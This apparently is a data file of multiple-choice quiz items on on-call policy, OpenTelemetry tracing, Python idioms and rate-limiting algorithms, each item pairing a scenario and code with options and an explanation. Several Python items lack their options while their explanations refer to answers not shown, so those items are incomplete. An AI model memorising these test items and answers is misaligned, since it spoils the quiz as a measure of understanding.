Treat the page volume as a bug: dedicate one sprint per quarter to alert quality and operational debt, reduce noise at the source
Move to a 24-hour shift model so engineers only do one bad day at a time
questions.explanation: Compensation, more headcount, and shift restructuring all treat symptoms. The actual problem is 23 pages a month, most of them at night. If those pages were actionable and valuable, the engineer would feel useful. The real fix is to reduce page volume at the source: delete useless alerts, fix the bugs causing repeat incidents, raise thresholds, automate runbook actions. Comp helps morale, but if every comped on-call shift is still a sleepless night, retention will not improve. The engineer in this story is asking for fewer 3am wake-ups, not a bigger paycheck for them.

questions.quizTitle: On-Call Rotation and Escalation Policy Quiz
questions.title: Routing Alerts to the Right Team
questions.situation: Your app team has been paged five times this month for issues that turned out to be database problems. Each time, the app on-call had to wake up, investigate, then page the database team. The database team has its own on-call rotation but no alerts are routed to them directly.
questions.code:
Current routing (Alertmanager):
route:
  receiver: app-team-pager
  group_by: ['alertname']

receivers:
  - name: app-team-pager
    pagerduty_configs:
      - service_key: <app-team-key>

Recent incidents app-team handled:
- DB connection pool exhausted (real cause: long-running query)
- Replication lag spike (real cause: backup job)
- Disk full on db primary (real cause: log rotation broken)
All routed to app-team, then manually escalated to db-team.
questions.question: An alert for a database is paging the application team. How should routing be set up?
options: Page both teams every time so nobody has to escalate manually
Route alerts to the team that owns the underlying service, using labels like service or team to pick the receiver
Have the app team learn database administration so they can fix these issues themselves
Move all database alerts to email so they don't wake anyone at night
questions.explanation: Alerts should reach the team that owns the failing component. Routing by labels (service, team, component) sends each alert to the right rotation directly. Paging both teams creates duplicate work and dilutes ownership, the database team will assume the app team is on it and vice versa. Cross-training is good but does not fix the routing bug. Moving database alerts to email loses urgency for genuinely critical issues. The fix is at the routing layer: tag metrics with owning team, route by label.

questions.quizTitle: On-Call Rotation and Escalation Policy Quiz
questions.title: Handling Mid-Shift Coverage Gaps
questions.situation: It's Tuesday afternoon. Alice is on-call for the week (Mon-Sun). She just messaged that she's running a fever and going to sleep, she'll be out for 24 to 48 hours. Friday is a US national holiday and three of your six engineers are US-based. Schedule below.
questions.code:
This week's schedule:
Mon  Tue  Wed  Thu  Fri  Sat  Sun
Alice Alice Alice Alice Alice Alice Alice

Secondary: Bob (US, off Friday for holiday)

Team availability:
- Alice (UK): Out sick 24-48h
- Bob (US): Available now, off Friday
- Carol (US): Off Friday
- Dave (US): Off Friday
- Eve (India): Available
- Frank (India): Available

It is currently 14:00 UTC Tuesday.
questions.question: Your on-call gets sick mid-shift and a public holiday is approaching. How do you handle coverage?
options: Move Alice's whole week to Bob and tell Bob to find someone for Friday himself
Use PagerDuty overrides: assign Bob primary until Alice returns, then split Friday between Eve and Frank by time zone; document the change so everyone knows who to escalate to
Leave the schedule as-is and hope Alice recovers before any alerts fire
Send the alerts to a shared Slack channel for the next few days until things stabilize
questions.explanation: Coverage gaps are normal and need an explicit process. Time-bounded overrides in your paging tool make the new assignments visible to everyone, including monitoring and escalations. Splitting Friday between two India-based engineers gives the US team a real day off without leaving the rotation uncovered. Pushing the problem onto Bob without a plan creates ambiguity and risks missed pages, particularly on Friday. Doing nothing or falling back to a shared Slack channel are exactly the patterns a proper escalation policy is supposed to replace.

questions.quizTitle: On-Call Rotation and Escalation Policy Quiz
questions.title: Using Postmortems to Improve On-Call
questions.situation: After a SEV-2 incident last week, the postmortem produced a list of action items. Your manager asks you which of these actually improves the on-call program long-term rather than just patching this one incident.
questions.code:
Postmortem action items:
1. Add a runbook entry for "queue consumer stalled"
2. Delete the alert "QueueDepthAbove1000" (fired all the time, ignored)
3. Replace it with "QueueConsumerLagAbove5m" (symptom-based)
4. Add automated restart for stalled consumers via systemd
5. Schedule a quarterly review of alerts that paged but had no action taken
6. Buy the team t-shirts that say "I survived incident #6042"
7. Train two more engineers on the queue subsystem so the rotation is not bottlenecked
questions.question: How should postmortem findings feed back into the on-call program?
options: Items 1 and 6, since runbooks and morale matter most
Just item 4, automation is the only real fix
Items 1, 2, 3, 4, 5, and 7 all reduce future page load or speed up response; item 6 is fine but irrelevant to the on-call program
Items 2 and 3 only, since deleting noisy alerts is the single highest-impact action
questions.explanation: A good postmortem produces operational improvements across multiple layers: documentation (runbooks), signal quality (delete noisy alerts, add symptom-based ones), automation (self-heal where possible), process (regular review of useless pages), and people (spread knowledge). Item 6 is fine for morale but does not change on-call load. Picking only one category misses the compound effect, the rotation gets better when you reduce noise AND automate fixes AND share knowledge. Treat the action item list as a portfolio of improvements, not a single silver bullet.

questions.title: Anatomy of a trace
questions.situation: You're onboarding a new SRE. They're staring at a Jaeger waterfall view with nested colored bars and ask what each bar represents.
questions.code:
# A trace, visualized as a waterfall:
checkout-request           [================] 800ms   <- root span (whole trace)
  +- auth-check            [==]               40ms   <- child span
  +- load-cart             [====]            120ms   <- child span
  |    +- db-query         [===]              90ms   <- grandchild span
  +- charge-card           [==========]      500ms   <- child span
questions.question: A junior engineer opens Jaeger for the first time and asks what the difference is between a trace and a span. What do you tell them?
options: A trace is the entire request from start to finish across all services; a span is one unit of work within that trace (a function call, a DB query, an HTTP request) and spans nest into a parent-child tree
A trace is a single function call; a span is the entire request across services
A trace is just a log line; a span is a metric counter
They are synonyms; OpenTelemetry uses both terms for backwards compatibility
questions.explanation: A trace is the full path of a request through your system. Spans are the building blocks: each one captures a single operation with a start time, duration, attributes, and a parent span ID. The first span in a trace has no parent and is called the root. The tree of spans reconstructs the request's call graph, which is exactly what the Jaeger waterfall is showing.

questions.title: Why are my traces split in two?
questions.situation: You added OpenTelemetry to a 2-service flow. Each service produces spans, but in Jaeger you see Service A's span as one trace and Service B's span as a totally different trace with a different trace ID. They should be connected.
questions.code:
# Service A makes a call:
curl http://service-b/users/42

# Headers seen at Service B:
> GET /users/42
> Host: service-b
> User-Agent: curl/8.0
# (no traceparent header)
questions.question: Service A calls Service B over HTTP. Both have OTel auto-instrumentation. Jaeger shows them as two separate single-span traces instead of one connected trace. What's missing?
options: The Jaeger backend is dropping spans; lower the sampling rate to fix it
Service A is not propagating the W3C traceparent header on outbound calls; without it, Service B has nothing to attach to and starts a fresh trace ID
You need to install the Jaeger agent on every node
Span IDs must be passed in the URL query string
questions.explanation: Trace context is propagated via the W3C traceparent header (and tracestate). The format is `traceparent: 00-<trace-id>-<parent-span-id>-<flags>`. If Service A's HTTP client does not inject this header, Service B has nothing to attach to and creates a new root span with a fresh trace ID. Auto-instrumentation usually injects it for you, but if A is using a raw HTTP library that's not patched, you need to either use the wrapped client, configure the propagator, or add middleware that injects the header.

questions.title: Adding tracing without rewriting every route
questions.situation: Your team owns a 2-year-old Flask + SQLAlchemy + Requests service with about 40 endpoints. Management wants tracing live by next sprint. You don't have time to write `with tracer.start_as_current_span(...)` everywhere.
questions.code:
pip install opentelemetry-distro opentelemetry-exporter-otlp
opentelemetry-bootstrap -a install

opentelemetry-instrument \
  --traces_exporter otlp \
  --service_name flask-shop \
  flask run
questions.question: You want OpenTelemetry tracing on an existing Python Flask service without manually wrapping every endpoint, DB call, and HTTP client. What's the fastest path to coverage?
options: Auto-instrumentation: install the OTel distro plus instrumentation packages for Flask/SQLAlchemy/Requests, then run with `opentelemetry-instrument`. This patches popular libraries at startup so you get spans without code changes
You must write a custom span around every function; auto-instrumentation does not exist for Python
Add `print()` statements and ship them to Loki
Use OpenTracing instead, since OTel does not support Flask
questions.explanation: Auto-instrumentation is the fastest way to get coverage on an existing app. The `opentelemetry-instrument` wrapper loads agents that monkey-patch known libraries (Flask, Django, SQLAlchemy, requests, redis, kafka, and many more) and emit spans automatically. You add manual spans later for business-specific operations like `process_order` or `apply_discount`. OpenTracing is the predecessor of OTel and is deprecated. Print statements are not tracing.

questions.title: Receivers, processors, exporters
questions.situation: You're reviewing a PR that adds an OpenTelemetry Collector deployment. Your teammate is new to OTel, pasted a starter config from the docs, and isn't sure why it has three plugin sections plus a pipeline.
questions.code:
receivers:
  otlp:
    protocols:
      grpc:
        endpoint: 0.0.0.0:4317
      http:
        endpoint: 0.0.0.0:4318
processors:
  batch:
    timeout: 5s
  memory_limiter:
    check_interval: 1s
    limit_mib: 512
exporters:
  otlp/jaeger:
    endpoint: jaeger:4317
    tls:
      insecure: true
service:
  pipelines:
    traces:
      receivers: [otlp]
      processors: [memory_limiter, batch]
      exporters: [otlp/jaeger]
questions.question: A teammate sends you this OTel Collector config and asks what each section does. What's the correct breakdown?
options: Receivers ingest telemetry from clients (here OTLP over gRPC and HTTP), processors transform/batch/filter spans before export, exporters send the data to a backend (Jaeger via OTLP). The pipeline wires them together for the traces signal
Receivers, processors, and exporters are all aliases for the same plugin; only one is enforced
The pipeline runs each section in parallel rather than in order
This config is invalid because OTLP requires both HTTP and gRPC enabled simultaneously
questions.explanation: The Collector has a clear three-stage architecture: receivers accept telemetry (OTLP, Jaeger, Zipkin, Prometheus), processors transform it (batching, sampling, attribute editing, memory limits), and exporters push it to a backend. The `service.pipelines` block is what actually wires these together per signal (traces, metrics, logs). Order in the processors list matters: `memory_limiter` should be first to drop incoming data when the Collector is under pressure, `batch` should be last to maximize export efficiency.

questions.title: Marking a span as failed
questions.situation: A retry block catches a transient timeout from the catalog API, retries, and succeeds. The trace looks healthy, but you want the failed first attempt to be visible in the waterfall as a red span so you can spot retry pressure during incidents.
questions.code:
from opentelemetry import trace
from opentelemetry.trace import Status, StatusCode

tracer = trace.get_tracer(__name__)

with tracer.start_as_current_span("call-catalog") as span:
    try:
        response = call_catalog_api(item_id)
    except CatalogTimeout as e:
        # span is shown as OK in Jaeger... how do you mark it ERROR?
        raise
questions.question: Your service caught an exception inside a span and recovered after a retry. The trace still shows the span as green/successful in Jaeger. How do you make the failure visible?
options: Add a span attribute `error: true`; OTel reads any attribute called `error` and marks the span red
Throw a Python exception with the magic word "OTEL_ERROR" in the message
Span status cannot be set in Python; only the Go SDK supports it
Set the span status with `span.set_status(Status(StatusCode.ERROR))` and call `span.record_exception(e)` to attach the exception as a span event with stack trace
questions.explanation: Span status is set explicitly with `set_status(StatusCode.ERROR)`. This is what backends use to render the span as failed. `record_exception(e)` adds a span event that captures the exception type, message, and stack trace, giving you debugging info inline with the trace. The `error: true` attribute convention is from older tracing tools and is not standard in OTel; Jaeger respects the OTel status code instead. Always set status AND record the exception, they serve different purposes.

questions.title: Tracing every request is too expensive
questions.situation: Traffic jumped from 1k rps to 50k rps after a launch. Your storage cost went up 30x. You still want statistical visibility for healthy traffic but don't need every single trace. What's the first knob you turn?
questions.code:
# Current SDK config: ALL traces are recorded
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.sampling import ALWAYS_ON, TraceIdRatioBased

provider = TracerProvider(sampler=ALWAYS_ON)  # 100%
# Goal: keep ~1% with consistent decisions across services
questions.question: Your service handles 50,000 requests per second. Storing every trace in Tempo is blowing the budget. What sampling approach should you start with?
options: Disable tracing in production; only run it in staging
Sample randomly at each service independently, so each service decides per span

Use head-based probabilistic sampling at the SDK with `TraceIdRatioBased(0.01)` to send 1% of traces; the trace ID hash makes the decision deterministic so all spans of a sampled trace are kept together
Set the OTel Collector to drop 99% of incoming spans randomly
questions.explanation: Head-based sampling decides at trace start whether to record or drop, then propagates the decision downstream via the traceparent sampled flag. `TraceIdRatioBased` uses the trace ID hash so the decision is deterministic: every service sees the same flag and either all keep or all drop the trace. Sampling per service independently produces broken traces (some spans missing, others kept). Random Collector-side dropping is even worse because it's not consistent per trace. For smarter filtering (keep all errors, sample healthy traffic), graduate to tail-based sampling at the Collector once head-based isn't enough.

questions.title: Finding the bottleneck in a 5-second checkout
questions.situation: The trace below is for the slow checkout. There are 8 services involved. You need to identify which one to escalate before paging the wrong team.
questions.question: A user reports 5-second checkout latency. You open the trace in Jaeger. Which span tells you where the time actually went?
options: auth-service is the bottleneck because authentication should be fastest
The total trace duration is just the sum of all child spans, so divide by 8 to get the average
payment-svc owns the trace; inside payment, db-write is the actual slow span at 4500ms. Investigate database locks, slow queries, or connection pool exhaustion
Without metrics there is no way to tell which span is slow from a trace
questions.explanation: Reading a waterfall is about following the long bars. payment-svc takes 4700ms of the parent's 5020ms, so the next question is 'what is payment doing?' Drilling in, db-write takes 4500ms of those 4700ms. That's where you focus. Common causes are lock contention, a missing index, a full table scan, or a blocked connection pool. Spans run in parallel when shown side-by-side and serially when stacked; a parent's duration is not the sum of its children, it's the wall clock time it spent. This is why traces beat logs for diagnosing distributed latency.

questions.title: Attribute, event, or link?
questions.situation: You have a span for processing an incoming order. You want to attach: the order ID (single value), the moment payment was authorized (a point in time within the span), and a reference to the upstream batch job that produced this message.
questions.code:
with tracer.start_as_current_span("process-order") as span:
    span.set_attribute("order.id", order_id)               # ?
    span.add_event("payment.authorized",                    # ?
                   attributes={"amount": amount})
    # Linking to the batch trace that produced this message
    span.add_link(extracted_batch_context)                  # ?
questions.question: You're capturing extra context on a span. When should something be a span attribute vs a span event vs a span link?
options: They are all the same thing; pick whichever name you like

Attributes are key/value metadata on the whole span (order.id), events are timestamped points within the span's lifetime (payment authorized at time T), links connect a span to other related spans in a different trace (the batch job that produced this message)
Events replace attributes in OTLP 2.0
Links are only used for debugging and have no effect on visualization
questions.explanation: Each has a distinct semantic purpose. Attributes describe properties that hold for the entire span (order ID, HTTP status code, user role). Events are micro-logs within a span carrying their own timestamp and attributes (payment authorized, cache miss, retry triggered). Links connect a span to one or more spans in different traces, used for fan-in patterns like batch jobs, message queues, or async workflows where a single operation has multiple causal parents. Backends visualize them differently: attributes appear in the span detail panel, events as markers on the span timeline, links as cross-trace navigation.

questions.title: service.name vs per-span attribute
questions.situation: You're setting up the OTel SDK in a new Go service and you see two ways to attach service identity: as resource attributes on the TracerProvider, or by calling `span.SetAttributes` in every span. Which is right?
questions.code:
res, _ := resource.New(ctx,
    resource.WithAttributes(
        semconv.ServiceNameKey.String("checkout-api"),
        semconv.ServiceVersionKey.String("1.4.2"),
        semconv.DeploymentEnvironmentKey.String("production"),
    ),
)
provider := sdktrace.NewTracerProvider(
    sdktrace.WithResource(res),
    sdktrace.WithBatcher(exporter),
)
questions.question: Where should you set fields like `service.name`, `service.version`, and `deployment.environment`? On every span, or somewhere else?
options: Set them on each span individually so different spans can have different service names
Hardcode them as environment variables that the trace UI reads directly
They go in the OTel Collector exporter config, not in the SDK

Set them as resource attributes on the TracerProvider; resources describe the entity producing the telemetry (service, host, container) and are attached to every span automatically without per-span overhead
questions.explanation: Resource attributes describe the entity emitting telemetry: the service, the host, the container, the cloud region. They're set once on the SDK and attached to every span/metric/log automatically. This avoids repeating identity fields on every span, lets backends filter by service correctly, and is what tools like Jaeger and Tempo use to populate the service list. Use semantic conventions (`service.name`, `service.version`, `deployment.environment.name`) so your data integrates cleanly with dashboards. Per-span attributes are for things that vary per operation, not for service identity.

questions.title: OTLP vs Jaeger vs Zipkin format
questions.situation: A new Java service needs to export traces. Your backend is Tempo today, but you may switch to Jaeger or Honeycomb later. The SDK supports multiple exporters. What's the right default?
questions.code:
# Possible exporter choices in the OTel SDK
exporters:
  - otlp        # OTLP over gRPC or HTTP (native to OTel)
  - jaeger      # Jaeger Thrift over UDP/HTTP (deprecated in OTel SDKs)
  - zipkin      # Zipkin JSON over HTTP
questions.question: You're choosing the wire protocol from your SDK. OTLP, Jaeger Thrift, Zipkin JSON, or all three? What should the default be in 2026?
options: Always use Jaeger Thrift; it's the original tracing format

OTLP is the native OpenTelemetry protocol and is supported by all major backends (Tempo, Jaeger, Honeycomb, Datadog). Export OTLP from your SDK and let the OTel Collector translate to other formats if needed
Export in all three at once for redundancy
Pick the format that matches your backend exactly; OTLP is just for testing
questions.explanation: OTLP (OpenTelemetry Protocol) is the native format and the long-term direction. The Jaeger and Zipkin exporters in OTel SDKs are being deprecated in favor of OTLP. The right pattern is: SDK exports OTLP -> OTel Collector receives OTLP -> Collector exports to whatever backend you actually use (Jaeger, Tempo, Datadog, Honeycomb). This decouples your applications from the backend choice. Modern backends accept OTLP directly, including Jaeger 1.50+ and all Tempo versions. Exporting multiple formats wastes bandwidth and adds complexity for no benefit.

questions.title: Keep all error traces, sample everything else
questions.situation: Your SLO budget is tight. You need every error trace for postmortems, but storing every successful trace is too expensive. Head-based sampling can't help because the trace start doesn't yet know whether it'll error. What's the right architecture?
questions.code:
# OTel Collector config
processors:
  tail_sampling:
    decision_wait: 30s
    num_traces: 100000
    policies:
      - name: errors-policy
        type: status_code
        status_code: { status_codes: [ERROR] }
      - name: latency-policy
        type: latency
        latency: { threshold_ms: 1000 }
      - name: probabilistic-policy
        type: probabilistic
        probabilistic: { sampling_percentage: 1 }
questions.question: You want to keep 100% of traces that contain an error and only 1% of healthy traces. Where do you make that decision and why?
options: This is impossible; you must pick one rate at the SDK and live with it
Use Jaeger's UI to filter on errors; it transparently re-samples in the backend
Set the SDK sampler to ALWAYS_ON and run a cron that deletes successful traces from storage

Use tail-based sampling in the OTel Collector: buffer all spans of a trace for `decision_wait`, then evaluate policies (keep errors, keep slow traces, keep 1% of normal traffic). The Collector decides after seeing the whole trace, which head-based sampling cannot do
questions.explanation: Tail-based sampling is the right tool when the keep/drop decision depends on properties revealed only after the trace ends (status, total latency, presence of a specific span). The Collector buffers all spans for a trace ID for `decision_wait` seconds, then runs policies in order. Common gotchas: you must put a load-balancing exporter in front of multiple Collector instances so all spans of a given trace land on the same instance; the buffer eats memory proportional to traffic volume; and `decision_wait` must be longer than your slowest realistic trace or late spans get cut off. SDK-side head sampling cannot do this because at trace start no one knows whether it will error.

questions.title: Why is my Tempo bill 10x higher than expected?
questions.situation: You're triaging a runaway Tempo bill. The service emits 5,000 spans per second and storage is full. A teammate added several attributes 'to help with debugging.' Now the bill is 10x what was forecast.
questions.code:
with tracer.start_as_current_span("get-user") as span:
    span.set_attribute("user.id", user_id)
    span.set_attribute("session.id", session_id)
    span.set_attribute("request.body", request.get_data().decode())
    span.set_attribute("response.body", json.dumps(response))
    span.set_attribute("trace.timestamp", time.time_ns())
questions.question: After adding tracing to a high-traffic service, your Tempo storage cost exploded. You investigate and find this attribute pattern on every span. What's wrong?
options: This is fine; tracing backends compress everything efficiently
The attribute keys are too short; backends penalize short keys

High-cardinality and high-volume attributes (full request/response bodies, free-form session IDs, per-call timestamps) blow up storage and index size. Bodies should be elided or hashed; capture them only on errors via span events; never store secrets
Tempo cannot store attributes at all; remove every set_attribute call
questions.explanation: Span attributes are stored and often indexed. Putting full request/response bodies on every span makes each span 10-100x larger and indexes balloon. Per-call unique values like session IDs explode cardinality, which makes attribute-based search unusably slow. A `timestamp` attribute is also redundant because the span already carries start and end timestamps. Better patterns: redact bodies, hash them, or attach them as a span event only when something interesting happens (an error, a slow path), and respect semantic conventions (`http.request.body.size` instead of the body itself). And never put PII or secrets in spans, since they leak to your tracing vendor and into long-term storage.

questions.title: Jumping from a latency spike to the actual trace
questions.situation: You're standing up a new observability stack with Mimir for metrics, Tempo for traces, and Loki for logs. Your engineers want to go from 'the chart shows a slow request' to 'here is the trace' in one click. What do you wire up?
questions.code:
from prometheus_client import Histogram
from opentelemetry import trace

http_duration = Histogram(
    "http_request_duration_seconds",
    "HTTP request duration",
    ["method", "route"],
)

with trace.get_current_span() as span:
    start = time.time()
    try:
        process_request()
    finally:
        duration = time.time() - start
        http_duration.labels(method, route).observe(
            duration,
            exemplar={
                "trace_id": format(span.get_span_context().trace_id, "032x")
            },
        )
questions.question: A Grafana panel shows a p99 latency spike. You want to click a single point on the histogram and jump straight to the trace that caused it. What feature makes this work?
options: Configure Grafana to fuzzy-search logs by approximate timestamp every time the user clicks a point
Manually paste trace IDs into a spreadsheet keyed by timestamp

Attach exemplars to histogram metrics: each observation carries the trace ID it came from. Grafana renders exemplars as dots on histogram panels and links them to Tempo via the configured trace data source. This is the standard Prometheus + OTel pattern for metric-to-trace correlation
Drop tracing and only use metrics; correlation across signals isn't possible
questions.explanation: Exemplars are the bridge between metrics and traces. When you record a histogram observation, you attach the current trace ID as an exemplar. Prometheus stores the exemplar alongside the bucket count, and Grafana plots them as small diamonds on the panel. Clicking jumps to the trace in your trace data source (Tempo, Jaeger). For logs, the equivalent is including the trace ID as a log field and using the Tempo data source's 'trace to logs' feature. This three-way correlation (metrics, trace, logs) is what makes modern observability fast: you go from 'the chart looks weird' to 'here is the actual request that did it' in seconds, instead of guessing with timestamps.

questions.title: List Comprehensions vs Loops
questions.situation: You have a list of numbers and need to create a new list containing only the squares of even numbers.
questions.question: Choose the most Pythonic way to filter and transform data.
options: result = [num ** 2 for num in numbers if num % 2 == 0]
result = list(map(lambda x: x**2, filter(lambda x: x%2==0, numbers)))
questions.explanation: List comprehensions are the most Pythonic way to create lists. They're readable, efficient, and concise while maintaining clarity about the operation being performed.

questions.title: Safe Dictionary Access
questions.situation: You're processing user data where some users might not have an 'email' field, and you want to avoid KeyError exceptions.
questions.code:
user_data = {'name': 'Alice', 'age': 30}
# Need to get email safely, return 'No email' if missing
questions.question: How do you safely access dictionary values that might not exist?
options: email = user_data['email'] if 'email' in user_data else 'No email'
email = user_data.get('email', 'No email')
questions.explanation: The .get() method is the most Pythonic way to safely access dictionary values with a default fallback. It's concise, readable, and handles missing keys gracefully.

questions.title: Modern String Formatting
questions.situation: You need to create a user greeting message with their name and account balance formatted as currency.
questions.code:
name = "Bob"
balance = 1234.56
# Goal: "Hello Bob, your balance is $1,234.56"
questions.question: What's the best way to format strings in modern Python?
options: message = "Hello " + name + ", your balance is $" + str(balance)
message = "Hello %s, your balance is $%.2f" % (name, balance)
message = "Hello {}, your balance is ${:,.2f}".format(name, balance)
message = f"Hello {name}, your balance is ${balance:,.2f}"
questions.explanation: F-strings (formatted string literals) are the most modern, readable, and efficient way to format strings in Python 3.6+. They allow inline expressions and formatting specifiers.

questions.title: Proper Exception Handling
questions.situation: You need to read a configuration file, but it might not exist or be corrupted. You want to handle errors gracefully.
questions.code:
# Need to read 'config.json' safely
# Return empty dict if file issues occur
questions.question: How should you handle exceptions when reading a file?
questions.explanation: Catch specific exceptions rather than using bare 'except' clauses. This allows for proper error handling while not masking unexpected errors. Using logging is also a best practice.

questions.title: Object-Oriented Design
questions.situation: You need a BankAccount class that protects the balance from direct modification and validates transactions.
questions.code:
# Requirements:
# - Private balance attribute
# - Deposit/withdraw methods with validation
# - Read-only balance property
questions.question: Design a class for representing a bank account with proper encapsulation.
questions.explanation: This design uses a protected attribute (_balance), a property for read-only access, and proper validation in methods. It follows Python conventions and encapsulation principles.

questions.title: Memory-Efficient Data Processing
questions.situation: You need to process a 10GB log file line by line, extracting error messages, without consuming excessive memory.
questions.code:
# Large file: server.log (10GB)
# Goal: Extract lines containing 'ERROR' efficiently
questions.question: How do you process a large file without loading it entirely into memory?
options:
with open('server.log') as f:
    lines = f.readlines()
    errors = [line for line in lines if 'ERROR' in line]
    return errors

import pandas as pd
df = pd.read_csv('server.log', sep='\n')
errors = df[df[0].str.contains('ERROR')]
questions.explanation: Using a generator function with yield creates a memory-efficient iterator that processes one line at a time. This approach can handle files of any size without memory issues.

questions.title: Resource Management
questions.situation: You need to connect to a database, perform operations, and guarantee the connection is closed. The database library's connection object does not document that its context manager closes the connection.
questions.code:
# Need to:
# 1. Connect to database
# 2. Execute queries
# 3. Ensure connection closes properly
questions.question: How do you ensure a database connection is closed even if an error occurs?
options:
conn = database.connect()
try:
    result = conn.execute(query)
    return result
finally:
    conn.close()

with database.connect() as conn:
    result = conn.execute(query)
    return result

conn = database.connect()
result = conn.execute(query)
conn.close()
return result

try:
    conn = database.connect()
    result = conn.execute(query)
    conn.close()
    return result
except Exception:
    conn.close()
    raise
questions.explanation: A try/finally block guarantees conn.close() runs after the operation, even when an exception is raised. A with statement is ideal only when the object's context manager is documented to close the resource. Some database connections, such as sqlite3.Connection, use the context manager for transaction handling but do not close the connection automatically.

questions.title: Function Decorators
questions.situation: You want to measure execution time for several functions in your application for performance monitoring.
questions.code:
# Need to time these functions:
def calculate_stats(data): ...
def process_data(data): ...
def generate_report(data): ...
questions.question: How do you add timing functionality to multiple functions without repeating code?
questions.explanation: Decorators provide a clean, reusable way to add functionality to functions. Using @wraps preserves the original function's metadata, and the decorator can be applied to any function.

questions.title: Asynchronous Programming
questions.situation: You need to fetch data from 10 different APIs. Sequential calls take 20 seconds total, but you want to make them concurrent.
questions.code:
import asyncio
import aiohttp

urls = ['api1.com', 'api2.com', ...] # 10 URLs
# Goal: Fetch all concurrently
questions.question: How do you efficiently handle multiple concurrent API calls?
options:
import requests

results = []
for url in urls:
    response = requests.get(url)
    results.append(response.json())

async def fetch_url(session, url):
    async with session.get(url) as response:
        return await response.json()

async def fetch_all():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_url(session, url) for url in urls]
        return await asyncio.gather(*tasks)

results = asyncio.run(fetch_all())
questions.explanation: Async/await with aiohttp is ideal for I/O-bound operations like API calls. It's more efficient than threading for this use case and handles concurrency elegantly with asyncio.gather().

questions.title: Advanced Class Behavior
questions.situation: You want to keep track of all User objects created in your application for debugging purposes, without modifying each User instantiation.
questions.code:
# Goal: Automatically track all User instances
# Without adding tracking code to each User() call
questions.question: How do you automatically track all instances of a class?
questions.explanation: Using __new__ method provides clean automatic instance tracking without requiring metaclasses. It intercepts object creation and is simpler than metaclasses for this use case.

questions.title: Letting Bursts Through Without Losing Control
questions.situation: Your mobile app stays quiet most of the time, then fires off 15 requests in a second when someone opens it to sync. The product team is fine with those short bursts. What they do not want is one client pulling 50 requests per second for minutes on end. You need a limiter that tolerates the burst but holds the long-run average down.
questions.code:
# Traffic shape per client:
#   idle ... then 15 requests in ~1s on app open ... idle
#   sustained abuse: 50 req/s for several minutes  <-- block this
#
# Goal: allow short bursts, cap the average rate
questions.question: You need an algorithm that lets clients make a short burst of requests but still caps their sustained rate. Which one fits?
options: Token bucket: tokens refill at a steady rate and a full bucket lets a burst through, but sustained traffic can only go as fast as the refill rate
Fixed window counter: count requests in each one second window and reject anything over the limit
Leaky bucket: process requests at a constant rate and drop anything that arrives faster
A simple per-client request counter that resets every hour
questions.explanation: Token bucket is the standard pick when you want to allow bursts but bound the average. The bucket holds up to N tokens, each request spends one, and tokens drip back in at a fixed rate. A client that has been idle has a full bucket, so the 15-request sync goes straight through. Once the bucket drains, they can only go as fast as tokens refill, which caps sustained abuse. Fixed window rejects the burst the moment it crosses the per-second count even though the client has been quiet. Leaky bucket forces a constant output rate and would smooth away the burst you actually want to allow. An hourly counter is too coarse to stop a 50 req/s flood within the hour.

questions.title: Twice the Limit at the Window Edge
questions.situation: You set a limit of 100 requests per minute per API key using a counter that resets at the top of each minute. A client sent 100 requests at 11:00:59 and another 100 at 11:01:01. Both batches were allowed. Your dashboards show 200 requests in about two seconds, double the limit you thought you enforced.
questions.code:
counter[key] window 11:00:00-11:00:59  -> 100 requests at 11:00:59  (allowed)
counter resets at 11:01:00
counter[key] window 11:01:00-11:01:59  -> 100 requests at 11:01:01  (allowed)

Observed: 200 requests in ~2 seconds
questions.question: Your fixed window rate limiter is set to 100 requests per minute, but a client somehow pushed through 200 requests in a few seconds. How?
options: The counter reset failed and let extra requests leak through
Fixed windows are fine; the client must have been using two API keys
Fixed window counters reset on a hard clock boundary, so a client can spend a full window at the end of one minute and another full window at the start of the next
100 requests per minute always means up to 200 in any 60 second span by design
questions.explanation: This is the classic boundary burst problem with fixed windows. The counter resets at a fixed clock boundary, so requests bunched at the end of one window and the start of the next both count as under the limit for their own window, even though they land within a couple of seconds of each other. The net effect is up to 2x your intended rate across any window boundary. The fix is a sliding window (log or counter) that measures the trailing 60 seconds instead of snapping to clock minutes. It was not a reset bug or a second key, and getting 200 in any 60s span is the bug, not the design goal.

questions.title: The Right Status Code for a Throttled Client
questions.situation: Your API enforces 1000 requests per hour per key. A client hits the cap and keeps calling. Right now your code returns 403 Forbidden with no extra headers, and client developers are confused because 403 looks like an auth problem. They keep retrying immediately, which makes things worse.
questions.code:
$ curl -i https://api.example.com/v1/orders
HTTP/1.1 403 Forbidden
content-type: application/json

{"error": "rate limited"}
questions.question: A client has blown past its rate limit and keeps calling. What HTTP status code should the API return, and what should it include?
options: 200 OK with an empty body so clients quietly back off on their own
429 Too Many Requests, with a Retry-After header telling the client how long to wait
503 Service Unavailable, since the server cannot serve the request right now
403 Forbidden is correct because the client is not allowed to make the request
questions.explanation: 429 Too Many Requests is the status code defined for rate limiting. Pairing it with a Retry-After header (seconds to wait, or an HTTP date) tells a well-behaved client exactly when to come back instead of guessing or hammering. 403 signals an authorization failure, which sends client developers down the wrong debugging path. 503 implies the whole service is down and often triggers aggressive retry logic and on-call alerts. Returning 200 with no body is the worst option: clients have no signal anything is wrong and keep calling at full speed.

questions.title: Protecting a Downstream That Hates Bursts
questions.situation: Your service forwards payment captures to a legacy processor that accepts at most 10 requests per second and starts erroring the moment you exceed that, even briefly. Your own incoming traffic is spiky. You need to feed the processor a smooth, constant stream no matter how bursty the input is.
questions.code:
incoming:   ||||      ||||||||        ||      (bursty, uneven)
              |
              v   rate limiter
              |
downstream: | | | | | | | | | |   <- must be a steady 10 req/s, no spikes
questions.question: You are putting a limiter in front of a downstream that can only handle a steady, constant request rate. Which algorithm should you choose?
options: Token bucket with a capacity of 100, so it can absorb the bursts
Fixed window counter set to 10 requests per second
Sliding window log keyed on the downstream's hostname
Leaky bucket: queue incoming requests and release them at a constant rate of 10 per second
questions.explanation: Leaky bucket is the right tool when the goal is a smooth, constant output rate. Requests enter a queue (the bucket) and leak out at a fixed rate, so the downstream sees an even 10 req/s no matter how spiky the input was. Token bucket is the opposite: a full bucket deliberately lets a burst through, which is exactly what this fragile downstream cannot take. Fixed window allows all 10 to fire in the same instant at the window start, producing a spike. A sliding window log limits how many requests happen but does not pace them out evenly, so bunched arrivals still hit the downstream together.

questions.title: Sliding Window Without the Memory Bill
